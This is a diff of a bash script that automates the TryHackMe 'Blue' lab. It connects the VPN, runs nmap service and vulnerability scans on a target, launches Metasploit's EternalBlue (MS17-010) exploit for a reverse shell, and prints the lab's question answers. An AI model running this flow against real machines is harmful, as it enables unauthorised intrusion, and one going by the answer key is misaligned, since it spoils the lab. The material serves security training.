@@ -7,6 +7,7 @@
 
 # 💙 General Banner
 show_banner() {
+    clear
     echo -e "\n\033[1;34m"
     echo "██████▄ ██│     ██│   ██│██████▄"
     echo "██╌╌██│██│     ██│   ██│██╌╌╌╌██"
@@ -20,26 +21,31 @@ show_banner() {
 
 # 🧠 Description Banner
 banner_description() {
+    clear
     echo -e "\n\033[1;36m==[ LAB DESCRIPTION ]==\033[0m"
 }
 
 # 📋 Tasks Banner
 banner_tasks() {
+    clear
     echo -e "\n\033[1;35m==[ TASK CHECKLIST ]==\033[0m"
 }
 
 # 🔌 VPN Banner
 banner_vpn() {
+    clear
     echo -e "\n\033[1;32m==[ VPN CONNECTION ]==\033[0m"
 }
 
 # ⚔️ Exploit Banner
 banner_exploit() {
+    clear
     echo -e "\n\033[1;31m==[ EXPLOITATION LAB ]==\033[0m"
 }
 
 # 📖 Answer Banner
 banner_answers() {
+    clear
     echo -e "\n\033[1;33m==[ QUESTIONS & ANSWERS ]==\033[0m"
 }
 
@@ -140,83 +146,65 @@ echo "========================================="
 # 📋 Lab task checklist
 show_tasks() {
     banner_tasks
+   clear
+   sleep 1
     echo "1. Connect to TryHackMe VPN"
+    sleep 1
     echo "2. Discover target machine"
+    sleep 1
     echo "3. Scan with Nmap"
+     sleep 1
     echo "4. Identify MS17-010 vulnerability"
+     sleep 1
     echo "5. Exploit using Metasploit"
+     sleep 1
     echo "6. Convert shell to Meterpreter"
+     sleep 1
     echo "7. Dump and crack hashes"
+     sleep 1
     echo "8. Find the flags "
+     sleep 1
 }
 
-# 🔌 VPN connection only
+# 🔌 Function: Connect VPN only
 connect_vpn() {
-    banner_vpn
-    echo "[*] Searching for available .ovpn files in ~/Downloads..."
-    mapfile -t vpn_files < <(find ~/Downloads -name "*.ovpn")
-    if [[ ${#vpn_files[@]} -eq 0 ]]; then
-        echo "[!] No .ovpn files found in ~/Downloads"
+clear
+    read -p "[?] Enter path to your TryHackMe .ovpn file: " vpnfile
+    if [[ ! -f "$vpnfile" ]]; then
+        echo "[!] Error: File not found: $vpnfile"
         return
     fi
-    echo "Available VPN Profiles:"
-    select vpnfile in "${vpn_files[@]}"; do
-        if [[ -n "$vpnfile" ]]; then
-            echo "[+] Starting VPN with: $vpnfile"
-            sudo openvpn --config "$vpnfile"
-            break
-        else
-            echo "[!] Invalid selection."
-        fi
-    done
+
+    echo "[+] Starting VPN..."
+    sudo openvpn --config "$vpnfile"
 }
-
-# ⚔️ Full exploitation flow
+# ⚔️ Function: Run full exploit process
 exploit_lab() {
-    banner_exploit
-    echo "[*] Searching for available .ovpn files in ~/Downloads..."
-    mapfile -t vpn_files < <(find ~/Downloads -name "*.ovpn")
-    if [[ ${#vpn_files[@]} -eq 0 ]]; then
-        echo "[!] No .ovpn files found in ~/Downloads"
+    read -p "[?] Enter path to your TryHackMe .ovpn file: " vpnfile
+    if [[ ! -f "$vpnfile" ]]; then
+        echo "[!] Error: File not found: $vpnfile"
         return
     fi
-    echo "Available VPN Profiles:"
-    select vpnfile in "${vpn_files[@]}"; do
-        if [[ -n "$vpnfile" ]]; then
-            echo "[+] Connecting VPN in background using: $vpnfile"
-            sudo openvpn --config "$vpnfile" &
-            break
-        else
-            echo "[!] Invalid selection."
-        fi
-    done
 
+    echo "[+] Connecting VPN..."
+    sudo openvpn --config "$vpnfile" &
     sleep 10
-    echo "[i] VPN started. Detecting LHOST IP..."
-    lhost=$(ip -4 addr show tun0 | grep inet | awk '{print $2}' | cut -d/ -f1)
-    echo "[+] Detected LHOST: $lhost"
+
+    echo "[i] VPN started. Checking interface..."
+    ip a | grep tun
 
     read -p "[?] Enter Target IP (RHOST): " rhost
+    read -p "[?] Enter Your IP (LHOST): " lhost
     read -p "[?] Enter Listening Port (LPORT, default 4444): " lport
     lport=${lport:-4444}
 
-    echo "[+] Running Nmap basic scan..."
+    echo "[+] Running Nmap (basic scan)..."
     nmap -sS -sV -O -Pn "$rhost" -oN initial_scan.txt
 
-    echo "[+] Running Nmap vulnerability scan..."
+    echo "[+] Running Nmap (vuln scripts)..."
     nmap -sV --script vuln "$rhost" -oN vuln_scan.txt
 
-    mkdir -p reports
-    echo "--- EternalBlue Report ---" > reports/eternalblue_report.txt
-    echo "Date: $(date)" >> reports/eternalblue_report.txt
-    echo "Target: $rhost" >> reports/eternalblue_report.txt
-    echo "LHOST: $lhost" >> reports/eternalblue_report.txt
-    echo -e "\n--- Nmap Scan ---\n" >> reports/eternalblue_report.txt
-    cat initial_scan.txt >> reports/eternalblue_report.txt
-    echo -e "\n--- Vuln Scan ---\n" >> reports/eternalblue_report.txt
-    cat vuln_scan.txt >> reports/eternalblue_report.txt
-
-    echo "[i] Scans saved as 'initial_scan.txt', 'vuln_scan.txt', and 'reports/eternalblue_report.txt'."
+    echo "[i] Scan complete. Saved to initial_scan.txt and vuln_scan.txt"
     read -p "[*] Press Enter to launch EternalBlue exploit..."
 
     msfconsole -q -x "
@@ -232,6 +220,7 @@ exit;"
 # 📖 Lab Q&A section
 show_answers() {
     banner_answers
+    clear
     echo "🔹 How many ports under 1000 are open?"
     echo "➡️  3"
     echo "🔹 Vulnerable to?"
